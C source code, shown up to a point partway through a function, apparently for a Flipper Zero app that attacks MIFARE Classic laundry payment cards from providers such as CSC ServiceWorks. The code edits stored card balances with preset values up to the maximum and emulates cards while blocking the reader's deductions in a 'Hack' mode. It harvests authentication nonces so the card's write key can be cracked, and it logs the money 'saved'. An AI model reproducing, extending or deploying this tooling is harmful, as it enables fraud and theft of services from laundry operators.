#include <furi.h>
#include <gui/gui.h>
#include <gui/view_dispatcher.h>
#include <gui/modules/submenu.h>
#include <gui/modules/widget.h>
#include <gui/modules/text_box.h>
#include <gui/modules/text_input.h>
#include <gui/modules/byte_input.h>
#include <gui/modules/popup.h>
#include <dialogs/dialogs.h>
#include <storage/storage.h>
#include <notification/notification_messages.h>
#include <stdarg.h>
#include <lib/nfc/nfc.h>
#include <lib/nfc/nfc_device.h>
#include <lib/nfc/nfc_listener.h>
#include <lib/nfc/protocols/mf_classic/mf_classic.h>
#include <lib/nfc/protocols/mf_classic/mf_classic_poller.h>
#include <lib/nfc/protocols/mf_classic/mf_classic_poller_sync.h>
#include <lib/nfc/protocols/mf_classic/mf_classic_listener.h>
#include <bit_lib/bit_lib.h>

#define TAG "LaundR"
#define NFC_APP_FOLDER EXT_PATH("nfc")
#define LAUNDR_APP_EXTENSION ".nfc"
#define SHADOW_FILE_EXTENSION ".laundr"
#define LAUNDR_APP_DATA_DIR EXT_PATH("apps_data/laundr")
#define LAUNDR_LOG_DIR EXT_PATH("apps_data/laundr/logs")
#define LAUNDR_SETTINGS_FILE EXT_PATH("apps_data/laundr/settings.txt")
#define LAUNDR_LOG_FILE EXT_PATH("apps_data/laundr/logs/laundr.log")
#define LAUNDR_MFKEY_LOG EXT_PATH("nfc/.mfkey32.log")  // Standard Flipper MFKey32 log location

// MFKey32 nonce capture - stores auth attempts for key cracking
#define MFKEY_MAX_NONCES 50
typedef struct {
    bool is_filled;      // Has both nonce pairs
    uint32_t cuid;       // Card UID
    uint8_t sector;      // Sector number
    uint8_t key_type;    // 0=A, 1=B
    uint32_t nt0, nr0, ar0;  // First nonce pair
    uint32_t nt1, nr1, ar1;  // Second nonce pair
} MfkeyNonce;
#define LAUNDR_SYSTEM_LOG_FILE EXT_PATH("apps_data/laundr/logs/system.log")
#define LAUNDR_TRANSACTION_LOG_FILE EXT_PATH("apps_data/laundr/logs/transactions.log")
#define LAUNDR_TRANSACTION_CSV_FILE EXT_PATH("apps_data/laundr/logs/transactions.csv")
#define LAUNDR_LOG_MAX_SIZE (64 * 1024) // 64KB max log size

// Version info - Codename: Thunder (5.x series - Default Emulation & Write Blocking)
#define LAUNDR_VERSION "5.58"
#define LAUNDR_CODENAME "KeyB Hunter Thunder"  // 5.58 = Added Write Nonce Captured display for KeyB tracking
#define LAUNDR_BUILD_DATE __DATE__
#define LAUNDR_BUILD_TIME __TIME__

// Custom orange blink for card writing (red + green = orange)
static const NotificationSequence sequence_blink_orange = {
    &message_red_255,
    &message_green_128,
    &message_blue_0,
    &message_delay_100,
    &message_red_0,
    &message_green_0,
    &message_delay_100,
    &message_do_not_reset,
    NULL,
};

// Solid green for write success
static const NotificationSequence sequence_solid_green = {
    &message_red_0,
    &message_green_255,
    &message_blue_0,
    &message_vibro_on,
    &message_delay_100,
    &message_vibro_off,
    &message_delay_500,
    &message_green_0,
    NULL,
};

// Solid red for write error
static const NotificationSequence sequence_solid_red = {
    &message_red_255,
    &message_green_0,
    &message_blue_0,
    &message_vibro_on,
    &message_delay_100,
    &message_vibro_off,
    &message_delay_100,
    &message_vibro_on,
    &message_delay_100,
    &message_vibro_off,
    &message_delay_500,
    &message_red_0,
    NULL,
};

// ============================================================================
// TYPES
// ============================================================================

typedef enum {
    LaundRViewSubmenu,
    LaundRViewWidget,
    LaundRViewMasterKey,  // Dedicated Master-Key audit screen
    LaundRViewTextBox,
    LaundRViewTextInput,
    LaundRViewByteInput,
    LaundRViewPopup,
} LaundRView;

// Removed custom auth modes - using default NFC stack emulation only

typedef enum {
    LaundRSubmenuIndexLoadCard,
    LaundRSubmenuIndexCSCMasterCard,   // Load embedded CSC ServiceWorks card
    LaundRSubmenuIndexReadCard,        // Read/Audit card from NFC reader
    LaundRSubmenuIndexWriteToCard,     // Write balance to physical card
    LaundRSubmenuIndexTestCardKeys,    // Test all known keys against card
    LaundRSubmenuIndexCrackKeyB,       // Try backdoor attack to get Key B
    LaundRSubmenuIndexViewCardInfo,
    LaundRSubmenuIndexStartEmulation,
    LaundRSubmenuIndexStopEmulation,
    LaundRSubmenuIndexApplyChanges,
    LaundRSubmenuIndexRevertChanges,
    LaundRSubmenuIndexEditBalance,
    LaundRSubmenuIndexSetBalance10,    // Quick preset: $10
    LaundRSubmenuIndexSetBalance25,    // Quick preset: $25
    LaundRSubmenuIndexSetBalance50,    // Quick preset: $50
    LaundRSubmenuIndexSetBalance100,   // Quick preset: $100
    LaundRSubmenuIndexSetBalanceMax,   // Set to max ($655.35)
    LaundRSubmenuIndexViewBlocks,
    LaundRSubmenuIndexEditBlock,
    LaundRSubmenuIndexViewLog,
    LaundRSubmenuIndexViewTransactionStats,  // View transaction history and totals
    LaundRSubmenuIndexClearLog,
    LaundRSubmenuIndexMasterKeyAudit,  // NEW: Separate Master-Key action
    LaundRSubmenuIndexHackMode,
    LaundRSubmenuIndexLegitMode,
    LaundRSubmenuIndexAbout,
} LaundRSubmenuIndex;

typedef enum {
    LaundRModeHack,          // Prevents balance writes
    LaundRModeLegit,         // Allows normal operations
    LaundRModeInterrogate,   // Active learning and analysis mode
} LaundRMode;

// Interrogation mode tracking structure
typedef struct {
    // Block access tracking
    uint32_t block_reads[64];        // Count of reads per block
    uint32_t block_writes[64];       // Count of writes per block
    uint32_t block_auth_attempts[64]; // Auth attempts per block

    // Sector access tracking
    uint32_t sector_reads[16];       // Reads per sector
    uint32_t sector_writes[16];      // Writes per sector
    bool sector_accessed[16];        // Which sectors were touched

    // Authentication tracking
    uint32_t key_a_successes[16];    // Successful Key A auths per sector
    uint32_t key_b_successes[16];    // Successful Key B auths per sector
    uint32_t key_a_failures[16];     // Failed Key A auths
    uint32_t key_b_failures[16];     // Failed Key B auths

    // Timing analysis
    uint32_t first_access_time;      // When reader first accessed card
    uint32_t last_access_time;       // Most recent access
    uint32_t total_operations;       // Total NFC operations

    // Pattern detection
    uint8_t observed_balance_blocks[4]; // Blocks that changed with balance
    bool balance_pattern_detected;    // Did we identify balance location?
    bool counter_pattern_detected;    // Did we identify counter location?

    // Reader behavior
    uint32_t transaction_count;       // Number of complete transactions
    bool reader_writes_observed;      // Has reader tried to write?
    bool reader_prefers_key_a;        // Does reader primarily use Key A?
    bool reader_prefers_key_b;        // Does reader primarily use Key B?
} InterrogationData;

typedef struct {
    // System
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Widget* widget;
    Widget* master_key_widget;  // Dedicated widget for Master-Key audit
    TextBox* text_box;
    TextInput* text_input;
    ByteInput* byte_input;
    Popup* popup;
    DialogsApp* dialogs;
    NotificationApp* notifications;
    Storage* storage;

    // NFC
    Nfc* nfc;
    NfcDevice* nfc_device;
    NfcListener* nfc_listener;
    MfClassicData* mfc_data;  // Keep allocated for device lifetime

    // Write to card state
    bool write_in_progress;
    uint8_t write_state;      // 0=idle, 1=waiting, 2=writing, 3=done, 4=error
    char write_status[64];    // Status message for display

    // Card data
    bool card_loaded;
    bool has_modifications;
    bool emulating;
    bool auto_restart_emulation;  // Auto-restart after transaction detected
    FuriTimer* transaction_monitor_timer;  // Monitors for balance changes during emulation
    uint16_t last_monitored_balance;  // Last balance we saw
    FuriString* file_path;
    FuriString* shadow_path;

    // Original blocks (read-only from .nfc file)
    uint8_t original_blocks[64][16];
    bool original_block_valid[64];

    // Modified blocks (from .laundr shadow file + live edits)
    uint8_t modified_blocks[64][16];
    bool modified_block_valid[64];

    // Runtime emulation blocks (modified during emulation)
    uint8_t emulation_blocks[64][16];
    bool emulation_block_valid[64];

    // Deep logging - track block access patterns
    uint8_t snapshot_blocks[64][16];    // Previous state for change detection
    bool snapshot_valid[64];            // Which blocks have valid snapshots
    uint32_t block_read_count[64];      // Reads per block this session
    uint32_t block_write_count[64];     // Writes per block this session
    uint32_t last_activity_tick;        // When we last saw activity
    bool deep_logging_enabled;          // Track block-level changes

    // MFKey32 nonce capture - passive key harvesting during emulation
    MfkeyNonce mfkey_nonces[MFKEY_MAX_NONCES];
    size_t mfkey_nonce_count;           // Number of nonces collected
    size_t mfkey_pairs_complete;        // Number of complete pairs (ready to crack)
    size_t mfkey_keyb_count;            // KeyB (write key) nonces specifically
    size_t mfkey_keyb_displayed;        // Last KeyB count displayed (for update detection)
    bool mfkey_keyb_captured;           // Flag: KeyB nonce captured this session
    uint32_t mfkey_cuid;                // Current card UID for nonce capture
    bool mfkey_capture_enabled;         // Enable/disable capture

    // Parsed card info
    char provider[32];
    uint16_t balance;
    uint16_t original_balance;
    uint16_t counter;
    char uid[64];
    LaundRMode mode;

    // Transaction stats (session)
    uint32_t reads;
    uint32_t writes;
    uint32_t writes_blocked;
    uint32_t current_uid_decimal;  // Current UID as decimal for display
    int16_t last_charge_amount;    // Last charge from reader (cents)
    uint32_t transaction_count;    // Number of completed transactions this session

    // Historical stats (loaded from CSV, persisted across sessions)
    uint32_t history_tx_count;     // Total transactions ever
    int32_t history_total_saved;   // Total cents saved (negative = money saved)

    // Interrogation mode
    InterrogationData interrogation;
    bool interrogation_active;

    // UI state
    FuriString* text_box_store;
    char text_input_buffer[32];
    uint8_t byte_input_buffer[16];
    uint8_t current_block_edit;

    // Widget strings
    char widget_str1[64];
    char widget_str2[64];
    char widget_str3[64];
    char widget_str4[64];
    char widget_str5[64];
    char widget_str6[64];

    // Master-Key widget strings
    char mk_title[64];
    char mk_status[128];
    char mk_config[128];
    char mk_progress[128];
    char mk_result[128];
    char mk_instruction[128];

    // Deferred stop timer
    FuriTimer* stop_timer;
} LaundRApp;

// ============================================================================
// FORWARD DECLARATIONS
// ============================================================================

static void laundr_submenu_callback(void* context, uint32_t index);
static void laundr_show_card_info(LaundRApp* app);
static void laundr_stop_emulation(LaundRApp* app);
static void laundr_rebuild_submenu(LaundRApp* app);
static uint32_t laundr_back_to_submenu_callback(void* context);
static uint32_t laundr_popup_back_callback(void* context);
static bool laundr_widget_input_callback(InputEvent* event, void* context);
static bool laundr_card_info_input_callback(InputEvent* event, void* context);
static void laundr_start_emulation(LaundRApp* app);
static void laundr_create_generic_card(LaundRApp* app);
static void laundr_show_master_key_audit(LaundRApp* app);
static void laundr_update_master_key_progress(LaundRApp* app);
static bool laundr_master_key_input_callback(InputEvent* event, void* context);
static void laundr_transaction_monitor_callback(void* context);
static void laundr_write_to_card(LaundRApp* app);
static void laundr_test_card_keys(LaundRApp* app);
static void laundr_crack_key_b(LaundRApp* app);
static bool laundr_write_input_callback(InputEvent* event, void* context);
static void laundr_read_card(LaundRApp* app);
static void laundr_set_balance_preset(LaundRApp* app, uint16_t cents);

// ============================================================================
// LOGGING FUNCTIONS
// ============================================================================

static void laundr_log_write(const char* format, ...) {
    Storage* storage = furi_record_open(RECORD_STORAGE);

    // Ensure directory structure exists
    storage_simply_mkdir(storage, EXT_PATH("apps_data"));
    storage_simply_mkdir(storage, LAUNDR_APP_DATA_DIR);
    storage_simply_mkdir(storage, LAUNDR_LOG_DIR);

    File* file = storage_file_alloc(storage);

    // Open log file in append mode
    if(storage_file_open(file, LAUNDR_LOG_FILE, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        // Get timestamp
        uint32_t tick = furi_get_tick();
        uint32_t seconds = tick / 1000;
        uint32_t ms = tick % 1000;

        // Write timestamp
        char timestamp[32];
        snprintf(timestamp, sizeof(timestamp), "[%lu.%03lu] ", seconds, ms);
        storage_file_write(file, timestamp, strlen(timestamp));

        // Write log message
        va_list args;
        va_start(args, format);
        char buffer[256];
        vsnprintf(buffer, sizeof(buffer), format, args);
        va_end(args);

        storage_file_write(file, buffer, strlen(buffer));
        storage_file_write(file, "\n", 1);

        storage_file_close(file);
    }

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

static void laundr_log_clear(void) {
    Storage* storage = furi_record_open(RECORD_STORAGE);
    storage_simply_remove(storage, LAUNDR_LOG_FILE);
    storage_simply_remove(storage, LAUNDR_SYSTEM_LOG_FILE);
    storage_simply_remove(storage, LAUNDR_TRANSACTION_LOG_FILE);
    storage_simply_remove(storage, LAUNDR_TRANSACTION_CSV_FILE);
    furi_record_close(RECORD_STORAGE);
}

// System log - for debug/system messages
static void laundr_log_system(const char* format, ...) {
    Storage* storage = furi_record_open(RECORD_STORAGE);

    storage_simply_mkdir(storage, EXT_PATH("apps_data"));
    storage_simply_mkdir(storage, LAUNDR_APP_DATA_DIR);
    storage_simply_mkdir(storage, LAUNDR_LOG_DIR);

    File* file = storage_file_alloc(storage);

    if(storage_file_open(file, LAUNDR_SYSTEM_LOG_FILE, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        uint32_t tick = furi_get_tick();
        uint32_t seconds = tick / 1000;
        uint32_t ms = tick % 1000;

        char timestamp[32];
        snprintf(timestamp, sizeof(timestamp), "[%lu.%03lu] ", seconds, ms);
        storage_file_write(file, timestamp, strlen(timestamp));

        va_list args;
        va_start(args, format);
        char buffer[256];
        vsnprintf(buffer, sizeof(buffer), format, args);
        va_end(args);

        storage_file_write(file, buffer, strlen(buffer));
        storage_file_write(file, "\n", 1);

        storage_file_close(file);
    }

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

// Transaction log - for human-readable transaction records
static void laundr_log_transaction(const char* format, ...) {
    Storage* storage = furi_record_open(RECORD_STORAGE);

    storage_simply_mkdir(storage, EXT_PATH("apps_data"));
    storage_simply_mkdir(storage, LAUNDR_APP_DATA_DIR);
    storage_simply_mkdir(storage, LAUNDR_LOG_DIR);

    File* file = storage_file_alloc(storage);

    if(storage_file_open(file, LAUNDR_TRANSACTION_LOG_FILE, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        uint32_t tick = furi_get_tick();
        uint32_t seconds = tick / 1000;
        uint32_t ms = tick % 1000;

        char timestamp[32];
        snprintf(timestamp, sizeof(timestamp), "[%lu.%03lu] ", seconds, ms);
        storage_file_write(file, timestamp, strlen(timestamp));

        va_list args;
        va_start(args, format);
        char buffer[256];
        vsnprintf(buffer, sizeof(buffer), format, args);
        va_end(args);

        storage_file_write(file, buffer, strlen(buffer));
        storage_file_write(file, "\n", 1);

        storage_file_close(file);
    }

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

// Transaction CSV database - structured transaction records
// Format: timestamp,tx_num,uid,provider,balance_before,balance_after,charge_cents,mode,block_writes,total_reads,total_writes
static void laundr_log_transaction_csv(
    uint32_t tx_num,
    const char* uid,
    const char* provider,
    uint16_t balance_before,
    uint16_t balance_after,
    int16_t charge_cents,
    const char* mode,
    uint32_t block_writes,
    uint32_t total_reads,
    uint32_t total_writes) {

    Storage* storage = furi_record_open(RECORD_STORAGE);

    storage_simply_mkdir(storage, EXT_PATH("apps_data"));
    storage_simply_mkdir(storage, LAUNDR_APP_DATA_DIR);
    storage_simply_mkdir(storage, LAUNDR_LOG_DIR);

    File* file = storage_file_alloc(storage);

    // Check if file exists to write header
    bool file_exists = storage_file_exists(storage, LAUNDR_TRANSACTION_CSV_FILE);

    if(storage_file_open(file, LAUNDR_TRANSACTION_CSV_FILE, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        // Write CSV header if new file
        if(!file_exists) {
            const char* header = "timestamp,tx_num,uid,provider,balance_before_cents,balance_after_cents,charge_cents,mode,block_writes,total_reads,total_writes\n";
            storage_file_write(file, header, strlen(header));
        }

        uint32_t tick = furi_get_tick();

        char buffer[512];
        snprintf(buffer, sizeof(buffer),
            "%lu,%lu,%s,%s,%u,%u,%d,%s,%lu,%lu,%lu\n",
            tick,
            tx_num,
            uid ? uid : "UNKNOWN",
            provider ? provider : "UNKNOWN",
            balance_before,
            balance_after,
            charge_cents,
            mode ? mode : "UNKNOWN",
            block_writes,
            total_reads,
            total_writes);

        storage_file_write(file, buffer, strlen(buffer));
        storage_file_close(file);
    }

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
}

// Load historical transaction stats from CSV file
// CSV format: timestamp,tx_num,uid,provider,balance_before,balance_after,charge_cents,...
// Field 1 = tx_num (transactions in that session), Field 6 = charge_cents
static void laundr_load_historical_stats(LaundRApp* app) {
    if(!app) return;

    app->history_tx_count = 0;
    app->history_total_saved = 0;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);

    if(storage_file_open(file, LAUNDR_TRANSACTION_CSV_FILE, FSAM_READ, FSOM_OPEN_EXISTING)) {
        char line[256];
        bool first_line = true;
        size_t pos = 0;

        while(!storage_file_eof(file)) {
            char c;
            if(storage_file_read(file, &c, 1) != 1) break;

            if(c == '\n' || pos >= sizeof(line) - 1) {
                line[pos] = '\0';
                if(!first_line && pos > 0) {
                    // Parse CSV fields
                    char* field = line;
                    int field_num = 0;
                    uint32_t session_tx_count = 0;
                    int32_t session_charge = 0;

                    while(field && field_num <= 6) {
                        char* next = strchr(field, ',');
                        if(next) *next = '\0';

                        if(field_num == 1) {
                            // tx_num - number of transactions in this session
                            session_tx_count = (uint32_t)strtoul(field, NULL, 10);
                        } else if(field_num == 6) {
                            // charge_cents - total charge for this session
                            session_charge = atoi(field);
                        }

                        if(next) field = next + 1;
                        else break;
                        field_num++;
                    }

                    // Add session stats to totals
                    // Note: CSV stores last charge only, not total for session
                    // This is an approximation but matches View Transaction Stats behavior
                    app->history_tx_count += session_tx_count;
                    app->history_total_saved += session_charge;
                }
                first_line = false;
                pos = 0;
            } else {
                line[pos++] = c;
            }
        }
        storage_file_close(file);
    }
    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);

    FURI_LOG_I(TAG, "Loaded history: %lu txns, $%.2f saved",
        app->history_tx_count, (double)(-app->history_total_saved) / 100);
}

// ============================================================================
// MFKEY32 NONCE CAPTURE - Passive key harvesting during emulation
// ============================================================================

// Add a nonce from authentication attempt
// NOTE: This runs during NFC communication - must be FAST, no disk I/O!
static void laundr_mfkey_add_nonce(LaundRApp* app, MfClassicAuthContext* auth_ctx) {
    if(!app || !auth_ctx || !app->mfkey_capture_enabled) return;

    uint8_t sector = mf_classic_get_sector_by_block(auth_ctx->block_num);
    uint8_t key_type = (auth_ctx->key_type == MfClassicKeyTypeA) ? 0 : 1;

    // Convert nonce data to uint32
    uint32_t nt = bit_lib_bytes_to_num_be(auth_ctx->nt.data, sizeof(MfClassicNt));
    uint32_t nr = bit_lib_bytes_to_num_be(auth_ctx->nr.data, sizeof(MfClassicNr));
    uint32_t ar = bit_lib_bytes_to_num_be(auth_ctx->ar.data, sizeof(MfClassicAr));

    // Try to find existing entry for this sector/key_type to add second nonce
    for(size_t i = 0; i < app->mfkey_nonce_count; i++) {
        MfkeyNonce* n = &app->mfkey_nonces[i];
        if(!n->is_filled && n->sector == sector && n->key_type == key_type) {
            // Add second nonce to complete the pair
            n->nt1 = nt;
            n->nr1 = nr;
            n->ar1 = ar;
            n->is_filled = true;
            app->mfkey_pairs_complete++;

            // Track completed KeyB pairs - WRITE KEY READY TO CRACK!
            if(key_type == 1) {  // KeyB
                app->mfkey_keyb_captured = true;
            }
            // NO LOGGING HERE - would cause timing issues during NFC
            return;
        }
    }

    // No existing entry - create new one with first nonce
    if(app->mfkey_nonce_count < MFKEY_MAX_NONCES) {
        MfkeyNonce* n = &app->mfkey_nonces[app->mfkey_nonce_count];
        n->is_filled = false;
        n->cuid = app->mfkey_cuid;
        n->sector = sector;
        n->key_type = key_type;
        n->nt0 = nt;
        n->nr0 = nr;
        n->ar0 = ar;
        app->mfkey_nonce_count++;

        // Track KeyB (write key) nonces specifically - this is what we need!
        if(key_type == 1) {  // KeyB
            app->mfkey_keyb_count++;
            app->mfkey_keyb_captured = true;
        }
        // NO LOGGING HERE - would cause timing issues during NFC
    }
}

// Save captured nonces to standard MFKey32 log file
static bool laundr_mfkey_save_nonces(LaundRApp* app) {
    if(!app || app->mfkey_pairs_complete == 0) return false;

    Storage* storage = furi_record_open(RECORD_STORAGE);
    File* file = storage_file_alloc(storage);
    bool success = false;

    if(storage_file_open(file, LAUNDR_MFKEY_LOG, FSAM_WRITE, FSOM_OPEN_APPEND)) {
        char line[256];
        size_t saved = 0;

        for(size_t i = 0; i < app->mfkey_nonce_count; i++) {
            MfkeyNonce* n = &app->mfkey_nonces[i];
            if(!n->is_filled) continue;

            // Standard MFKey32 format
            int len = snprintf(line, sizeof(line),
                "Sec %d key %c cuid %08lx nt0 %08lx nr0 %08lx ar0 %08lx nt1 %08lx nr1 %08lx ar1 %08lx\n",
                n->sector,
                n->key_type ? 'B' : 'A',
                (unsigned long)n->cuid,
                (unsigned long)n->nt0,
                (unsigned long)n->nr0,
                (unsigned long)n->ar0,
                (unsigned long)n->nt1,
                (unsigned long)n->nr1,
                (unsigned long)n->ar1);

            storage_file_write(file, line, len);
            saved++;
        }

        storage_file_close(file);
        laundr_log_write("MFKey: Saved %zu nonce pairs to %s", saved, LAUNDR_MFKEY_LOG);
        laundr_log_transaction("KEY CAPTURE: %zu nonce pairs saved - run MFKey32 to crack!", saved);
        success = true;
    }

    storage_file_free(file);
    furi_record_close(RECORD_STORAGE);
    return success;
}

// Reset nonce capture state
static void laundr_mfkey_reset(LaundRApp* app) {
    if(!app) return;
    memset(app->mfkey_nonces, 0, sizeof(app->mfkey_nonces));
    app->mfkey_nonce_count = 0;
    app->mfkey_pairs_complete = 0;
    app->mfkey_keyb_count = 0;
    app->mfkey_keyb_displayed = 0;
    app->mfkey_keyb_captured = false;
}

// Listener callback for nonce capture during emulation
// IMPORTANT: This callback must be fast and non-blocking to not disrupt NFC timing
static NfcCommand laundr_emulation_callback(NfcGenericEvent event, void* context) {
    LaundRApp* app = context;
    if(!app) return NfcCommandContinue;

    // Only process MfClassic events
    if(event.protocol == NfcProtocolMfClassic && event.event_data) {
        MfClassicListenerEvent* mfc_event = event.event_data;

        // MfClassicListenerEventTypeAuthContextPartCollected fires on FAILED auth attempts
        // (when reader tries a key we don't have) - perfect for capturing unknown Key B
        // Successful auths (keys we have) proceed normally without triggering this
        if(mfc_event->type == MfClassicListenerEventTypeAuthContextPartCollected) {
            if(mfc_event->data) {
                MfClassicAuthContext* auth_ctx = &mfc_event->data->auth_context;
                laundr_mfkey_add_nonce(app, auth_ctx);
            }
        }
    }

    // CRITICAL: Always return Continue to not disrupt normal emulation flow
    return NfcCommandContinue;
}

// ============================================================================
// PARSING HELPERS
// ============================================================================

static bool parse_hex_byte(const char* hex, uint8_t* byte) {
    if(!hex || !byte) return false;

    // Handle unknown bytes "??" -> use 0xFF (common default for uncracked keys)
    if(hex[0] == '?' && hex[1] == '?') {
        *byte = 0xFF;
        return true;
    }

    char high = hex[0];
    char low = hex[1];

    if(high >= '0' && high <= '9') *byte = (high - '0') << 4;
    else if(high >= 'A' && high <= 'F') *byte = (high - 'A' + 10) << 4;
    else if(high >= 'a' && high <= 'f') *byte = (high - 'a' + 10) << 4;
    else return false;

    if(low >= '0' && low <= '9') *byte |= (low - '0');
    else if(low >= 'A' && low <= 'F') *byte |= (low - 'A' + 10);
    else if(low >= 'a' && low <= 'f') *byte |= (low - 'a' + 10);
    else return false;

    return true;
}

static bool parse_nfc_file_line(const char* line, uint8_t blocks[64][16], bool block_valid[64], char* uid, size_t uid_size) {
    if(strncmp(line, "Block ", 6) == 0) {
        uint8_t block_num = 0;
        if(sscanf(line + 6, "%hhu:", &block_num) == 1 && block_num < 64) {
            const char* colon = strchr(line, ':');
            if(!colon) return false;
            colon++;

            while(*colon == ' ') colon++;

            uint8_t byte_count = 0;
            while(*colon && byte_count < 16) {
                while(*colon == ' ') colon++;
                if(!*colon) break;

                if(!parse_hex_byte(colon, &blocks[block_num][byte_count])) {
                    break;
                }

                byte_count++;
                colon += 2;
            }

            if(byte_count == 16) {
                block_valid[block_num] = true;
                return true;
            }
        }
    }

    if(strncmp(line, "UID: ", 5) == 0) {
        const char* uid_start = line + 5;
        size_t len = 0;

        const char* p = uid_start;
        char* out = uid;
        while(*p && len < uid_size - 1) {
            if(*p != ' ' && *p != '\r' && *p != '\n') {
                *out++ = *p;
                len++;
            }
            p++;
        }
        *out = '\0';
        return true;
    }

    return false;
}

// Load original .nfc file (read-only)
static bool laundr_load_nfc_file(LaundRApp* app, const char* file_path) {
    FURI_LOG_I(TAG, "Loading NFC file: %s", file_path);

    memset(app->original_blocks, 0, sizeof(app->original_blocks));
    memset(app->original_block_valid, 0, sizeof(app->original_block_valid));
    app->uid[0] = '\0';

    File* file = storage_file_alloc(app->storage);
    if(!storage_file_open(file, file_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_E(TAG, "Failed to open NFC file");
        storage_file_free(file);
        return false;
    }

    char line[256];
    while(true) {
        size_t pos = 0;
        while(pos < sizeof(line) - 1) {
            char c;
            if(storage_file_read(file, &c, 1) != 1) break;
            if(c == '\n') break;
            if(c != '\r') line[pos++] = c;
        }
        line[pos] = '\0';

        if(pos == 0 && storage_file_eof(file)) break;

        parse_nfc_file_line(line, app->original_blocks, app->original_block_valid, app->uid, sizeof(app->uid));
    }

    storage_file_close(file);
    storage_file_free(file);

    FURI_LOG_I(TAG, "NFC file loaded successfully");
    return true;
}

// Load shadow file (.laundr) with modifications
static bool laundr_load_shadow_file(LaundRApp* app, const char* shadow_path) {
    FURI_LOG_I(TAG, "Loading shadow file: %s", shadow_path);

    File* file = storage_file_alloc(app->storage);
    if(!storage_file_open(file, shadow_path, FSAM_READ, FSOM_OPEN_EXISTING)) {
        FURI_LOG_I(TAG, "No shadow file found (this is OK)");
        storage_file_free(file);
        return false;
    }

    uint8_t temp_blocks[64][16];
    bool temp_valid[64];
    memset(temp_blocks, 0, sizeof(temp_blocks));
    memset(temp_valid, 0, sizeof(temp_valid));

    char line[256];
    char temp_uid[64];
    while(true) {
        size_t pos = 0;
        while(pos < sizeof(line) - 1) {
            char c;
            if(storage_file_read(file, &c, 1) != 1) break;
            if(c == '\n') break;
            if(c != '\r') line[pos++] = c;
        }
        line[pos] = '\0';

        if(pos == 0 && storage_file_eof(file)) break;

        parse_nfc_file_line(line, temp_blocks, temp_valid, temp_uid, sizeof(temp_uid));
    }

    storage_file_close(file);
    storage_file_free(file);

    // Apply shadow file modifications
    for(int i = 0; i < 64; i++) {
        if(temp_valid[i]) {
            memcpy(app->modified_blocks[i], temp_blocks[i], 16);
            app->modified_block_valid[i] = true;
        }
    }

    FURI_LOG_I(TAG, "Shadow file loaded successfully");
    return true;
}

// Save last opened card path to settings
static void laundr_save_last_card(LaundRApp* app, const char* file_path) {
    if(!app || !file_path) return;

    // Ensure directory exists
    FuriString* dir_path = furi_string_alloc_set(LAUNDR_SETTINGS_FILE);
    size_t last_slash = furi_string_search_rchar(dir_path, '/');
    if(last_slash != FURI_STRING_FAILURE) {
        furi_string_left(dir_path, last_slash);
        storage_simply_mkdir(app->storage, furi_string_get_cstr(dir_path));
    }
    furi_string_free(dir_path);

    // Save file path
    File* file = storage_file_alloc(app->storage);
    if(storage_file_open(file, LAUNDR_SETTINGS_FILE, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        storage_file_write(file, file_path, strlen(file_path));
        storage_file_close(file);
        FURI_LOG_I(TAG, "Saved last card: %s", file_path);
    }
    storage_file_free(file);
}

// Save shadow file
static bool laundr_save_shadow_file(LaundRApp* app, const char* shadow_path) {
    FURI_LOG_I(TAG, "Saving shadow file: %s", shadow_path);

    File* file = storage_file_alloc(app->storage);
    if(!storage_file_open(file, shadow_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
        FURI_LOG_E(TAG, "Failed to create shadow file");
        storage_file_free(file);
        return false;
    }

    storage_file_write(file, "# LaundR Shadow File\n", 21);
    storage_file_write(file, "# Modifications to apply on top of original .nfc file\n", 54);
    storage_file_write(file, "# Only modified blocks are stored\n", 35);
    storage_file_write(file, "\n", 1);

    char buf[128];
    for(int i = 0; i < 64; i++) {
        if(app->modified_block_valid[i]) {
            bool differs = !app->original_block_valid[i];
            if(!differs && app->original_block_valid[i]) {
                for(int j = 0; j < 16; j++) {
                    if(app->modified_blocks[i][j] != app->original_blocks[i][j]) {
                        differs = true;
                        break;
                    }
                }
            }

            if(differs) {
                snprintf(buf, sizeof(buf), "Block %d: ", i);
                storage_file_write(file, buf, strlen(buf));

                for(int j = 0; j < 16; j++) {
                    snprintf(buf, sizeof(buf), "%02X ", app->modified_blocks[i][j]);
                    storage_file_write(file, buf, 3);
                }
                storage_file_write(file, "\n", 1);
            }
        }
    }

    storage_file_close(file);
    storage_file_free(file);

    FURI_LOG_I(TAG, "Shadow file saved successfully");
    return true;
}

// Detect provider
static void laundr_detect_provider(LaundRApp* app) {
    snprintf(app->provider, sizeof(app->provider), "Unknown");

    // Check Block 2 for CSC ServiceWorks signature (0x0101 at offset 0-1)
    if(app->modified_block_valid[2]) {
        uint8_t* b2 = app->modified_blocks[2];
        if(b2[0] == 0x01 && b2[1] == 0x01) {
            snprintf(app->provider, sizeof(app->provider), "CSC ServiceWorks");
            return;
        }
    }

    // Check Block 1 for U-Best Wash or other ASCII signatures
    if(app->modified_block_valid[1]) {
        uint8_t* b1 = app->modified_blocks[1];
        char ascii[17] = {0};
        for(int i = 0; i < 16; i++) {
            ascii[i] = (b1[i] >= 32 && b1[i] <= 126) ? b1[i] : '.';
        }

        if(strstr(ascii, "UBESTWASH")) {
            snprintf(app->provider, sizeof(app->provider), "U-Best Wash");
            return;
        }
    }
}

// Parse balance
static void laundr_parse_balance(LaundRApp* app) {
    app->balance = 0;
    app->counter = 0;

    if(!app->modified_block_valid[4]) return;

    uint8_t* b4 = app->modified_blocks[4];

    uint16_t val = (uint16_t)b4[0] | ((uint16_t)b4[1] << 8);
    uint16_t cnt = (uint16_t)b4[2] | ((uint16_t)b4[3] << 8);
    uint16_t val_inv = (uint16_t)b4[4] | ((uint16_t)b4[5] << 8);
